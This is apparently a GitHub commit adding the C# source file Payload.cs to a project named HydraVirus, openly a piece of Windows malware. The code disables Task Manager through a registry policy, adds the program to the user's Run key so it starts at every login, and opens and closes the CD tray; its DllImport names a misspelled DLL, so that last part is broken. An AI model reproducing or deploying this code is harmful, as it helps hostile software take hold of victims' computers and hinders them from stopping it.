6e7fe7fb6ccd2b9f4542a3f6b50da605d5503432
Pralka53 <79445105+Pralka53@users.noreply.github.com>
2021-07-29 17:18:18 +0200

    Add files via upload

---
+++ HydraVirus/Payload.cs
@@ -0,0 +1,46 @@
+﻿using System;
+using System.Runtime.InteropServices;
+using System.Windows.Forms;
+using System.Threading;
+using System.Media;
+using Microsoft.Win32;
+using System.Drawing;
+using System.Drawing.Imaging;
+using System.IO;
+using System.Net;
+
+namespace HydraVirus
+{
+    class Payload
+    {
+        [DllImport("winm.dll", EntryPoint = "mciSendString")]
+        public static extern int mciSendString(string lpstrCommand, string lpstrReturnString, int uRetrunLenght, int hwndCallback);
+
+        public void BlockTaskMgr()
+        {
+            RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
+            if(key.GetValue("DisableTaskMgr") == null)
+            {
+                key.SetValue("DisableTaskMgr", "1");
+            }
+        }
+        
+        public void OpenDisck()
+        {
+            try
+            {
+                int result = mciSendString("set cdaudio door open", null, 0, 0);
+                Thread.Sleep(3000);
+                result = mciSendString("set cdaudio door close", null, 0, 0);
+            }
+            catch (Exception ex)
+            { }
+        }
+
+        public void AutoStart()
+        {
+            RegistryKey reg = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
+            reg.SetValue("Hydra", Application.ExecutablePath.ToString());
+        }
+    }
+}
